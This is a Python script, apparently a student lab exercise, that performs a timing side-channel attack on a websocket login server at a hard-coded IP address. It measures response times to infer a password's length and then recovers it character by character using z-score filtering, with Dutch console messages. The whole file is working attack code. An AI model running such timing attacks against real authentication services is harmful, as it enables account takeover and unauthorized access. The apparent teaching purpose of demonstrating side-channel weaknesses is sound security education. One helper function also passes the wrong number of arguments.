import asyncio, websockets, statistics, math
from json import dumps, loads
from time import sleep, time, perf_counter

listx = [chr(i) for i in range(ord('a'), ord('z')+1)] + [str(i) for i in range(10)]

async def client_connect(username, password):
    """Handle sending and receiving logins to/from the server.
    'while True' structure prevents singular network/socket
    errors from causing full crash.

    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt

    Returns
    -------
        reply -- string of server's response to login attempt
    """

    server_address = "ws://20.224.193.77:3840"

    while True:
        try:
            async with websockets.connect(server_address) as websocket:
                begin = perf_counter()
                await websocket.send(dumps([username,password]))
                reply = await websocket.recv()
                end = perf_counter()
                rep = loads(reply)
                tijd = end - begin
                return tijd
        except:
            continue

def call_server(username, password):
    """Send a login attempt to the server and return the response.

    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt

    Returns
    -------
        reply -- string of server's response to login attempt
    """
    
    reply = asyncio.get_event_loop().run_until_complete(client_connect(username,password))
    sleep(0.01) # Wait so as to not overload the server with 90 students at once!
    return (reply)

async def response_password(username, password):
    """Handle sending and receiving logins to/from the server.
    'while True' structure prevents singular network/socket
    errors from causing full crash.

    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt

    Returns
    -------
        reply -- string of server's response to login attempt
    """

    server_address = "ws://20.224.193.77:3840"

    while True:
        try:
            async with websockets.connect(server_address) as websocket:
                await websocket.send(dumps([username,password]))
                reply = await websocket.recv()
                response = loads(reply)
                return response
        except:
            continue



def calculate_standard_deviation(numbers):
    """
    Calculates the sample standard deviation of a list of numbers.

    Args:
        numbers (list): A list of numeric values.

    Returns:
        float: The sample standard deviation of the input list.
    """
    # Step 1: Calculate the mean of the input list
    num_values = len(numbers)
    mean = sum(numbers) / num_values

    # Step 2: Calculate the sum of squared deviations from the mean
    sum_of_squared_deviations = 0
    for x in numbers:
        deviation = x - mean
        squared_deviation = deviation ** 2
        sum_of_squared_deviations += squared_deviation

    # Step 3: Calculate the sample standard deviation using the formula
    sample_variance = sum_of_squared_deviations / (num_values - 1)
    sample_standard_deviation = math.sqrt(sample_variance)

    return sample_standard_deviation


def calculate_z_score(numbers, index):
    """
    Calculates the z-score of a value at a specified index in a list of numbers.

    Args:
        numbers (list): A list of numeric values.
        index (int): The index of the value for which to calculate the z-score.
        mean (float, optional): The mean of the input list. If not provided, the function calculates it.
        standard_deviation (float, optional): The standard deviation of the input list. If not provided, the function calculates it.

    Returns:
        float: The z-score of the value at the specified index.
    """
    mean=None
    standard_deviation=None

    if mean is None:
        # Calculate the mean of the input list
        mean = sum(numbers) / len(numbers)

    if standard_deviation is None:
        # Calculate the standard deviation of the input list
        variance = sum((x - mean) ** 2 for x in numbers) / (len(numbers) - 1)
        standard_deviation = math.sqrt(variance)

    # Calculate the z-score of the value at the specified index
    value = numbers[index]
    z_score = (value - mean) / standard_deviation

    return z_score


def find_password_length(username):
    """
    Finds the length of a password for a given user by calling the server API and analyzing the response times.

    Args:
        user (str): The user for whom to find the password length.

    Returns:
        int: The length of the password for the given user.
    """
    # Initialize variables
    final_times = [0] * 20
    num_attempts = 50
    count = 0
    num_letters = 0
    
    # Enters a loop that runs for the number of attempts specified by num_attempts
    for i in range(num_attempts):
        times = []
        password = ''

        # calls the Call_server with the current user and password and appends the response time to the list of times.
        for x in range(20):

            # initializes variables:
            time = call_server(username, password)
            times.append(time)
            password += "*"
        
        # calculates the z-score for each time in the list of times using the function
        for x in range(20):
            # If the z-score is less than 1, 
            # it adds that time to its corresponding index in final_times; 
            # otherwise, it adds the mean time to final_times

            z_score = calculate_z_score(times, x)
            mean_time = sum(times) / len(times)
            if z_score < 1:
                final_times[x] += times[x]
            else:
                final_times[x] += mean_time
    
    #  finds the highest time in final_times and sets num_letters 
    highest_time = max(final_times)
    for i, time in enumerate(final_times):
        if time == highest_time:
            num_letters = count
        count += 1
    
    return num_letters


def find_character(username, prefix, suffix):
    """Finds the character in the password that takes the longest to verify.

    Args:
        username (str): The username to use for server authentication.
        prefix (str): The part of the password that comes before the character being tested.
        suffix (str): The part of the password that comes after the character being tested.

    Returns:
        str: The character in the password that takes the longest to verify.

    """
    # Initialize variables
    num_chars = len(listx)
    attempts = 100
    final_times = [0] * num_chars
    letter_counts = [0] * num_chars
    
    # Make attempts
    for i in range(attempts):
        times = [0] * num_chars
        for x in range(num_chars):
            password = prefix + listx[x] + suffix
            time = call_server(username, password)
            times[x] += time
        
        # Calculate mean time and z-scores for each character
        mean_time = sum(times) / num_chars
        for z in range(num_chars):
            z_score = calculate_z_score(times, z)
            if z_score < 3:
                final_times[z] += times[z]
            else:
                final_times[z] += mean_time
    
    # Find character with highest total time
    highest_time = max(final_times)
    for i in range(num_chars):
        if final_times[i] == highest_time:
            letter_counts[i] += 1
    
    # Return character with highest total time
    character_index = letter_counts.index(max(letter_counts))
    return listx[character_index]
    

def generate_password(username):
    """
    Generates a password for the given username by making requests to a server to test the time it takes to check a password.

    Args:
        username (str): The username to generate a password for.

    Returns:
        str: The generated password.
    """

    # Initialize variables
    user = username
    password_length = find_password_length(user)
    password = ''
    mask = '*' * (password_length - 1)
    attempts = 100
    
    # Find each character of the password
    for i in range(password_length):
        char = find_character(username, attempts, password, mask)
        password += char
        mask = mask[1:] + char
        print(char)
    return password


def guess_last_character(username, prefix):
    """
    Given a username and password prefix, guesses the last character of the password by trying all possible characters and
    measuring the response time of the server.

    Args:
        username (str): The username to use for guessing the password.
        prefix (str): The prefix of the password.

    Returns:
        The function doesn't return anything, it simply prints the password with its corresponding response time to the console.
    """
    
    # Iterate over all possible characters and test them
    for c in listx:
        password = prefix + c
        reply = asyncio.get_event_loop().run_until_complete(response_password(username,password))
        sleep(0.01) # Wait so as not to overload the server with 90 students at once!
        response_time = reply
        print(password + response_time)
        


def crack_password(studentnummer):
    """
    This function attempts to crack the password of a student account given their student number.
    
    Args:
        studentnummer (str): The student number of the account whose password is being cracked.
        
    Returns:
        The cracked password.
    """

    #Store the student number in a variable
    studentnr = studentnummer
    print ('Het studentennummer is:',studentnr)
    print ('Het studentennummer is correct. De lengte wordt nu achterhaald.')

    # Separator for readability.
    print ('**********************')  

    # Determine the length of the password using an external function
    presuffix = find_password_length(studentnr) 
    print ('De lengte van het wachtwoord is: ',presuffix)
    print ('**********************')

    # Create a string of asterisks with a length equal to one less than that of the password 
    suffix = '*' * (presuffix-1)

    # Notify user that guessing has begun 
    print ('Het wachtwoord wordt nu geraden.') 
    print ('**********************')
    prefix = ''
    while suffix:
        
        guess = find_character(studentnr, prefix, suffix)
        if guess is None:
            break
        prefix += guess
        suffix = suffix[:-1]

        # Print out progress so far
        print ('Dit is het wachtwoord tot nu toe:', prefix) 
        print ('**********************')
    before_crack = prefix
    return guess_last_character(studentnr, before_crack)


def ask_student_number():
    """
    This function prompts the user to enter their student number and validates it. 
    If the student number is valid, it calls the crack_password function to crack the password. 
    If not, it recursively calls itself until a valid student number is entered.
    
    Return:
            The cracked password if a valid student number is entered.
    """

    # Separator for readability
    print ('**********************') 
    print ('Welkom bij de side-channel attacker van Emma en Rudy!')
    print ('**********************')

    # Prompt user to enter their student number
    studentnummer = input("Wat is jouw studentennummer? ")  
    print ('**********************')

    # Check if the entered student number is valid (6 digits and numeric)
    if len(studentnummer) == 6 and studentnummer.isnumeric():  
        return crack_password(studentnummer)

    # If not valid, print error message and recursively call this function again 
    else:
        print ('**********************')  
        print ('Error 404') 
        print("Ongeldig studentennummer, probeer opnieuw!")
        print ('**********************')
        return ask_student_number()

ask_student_number()
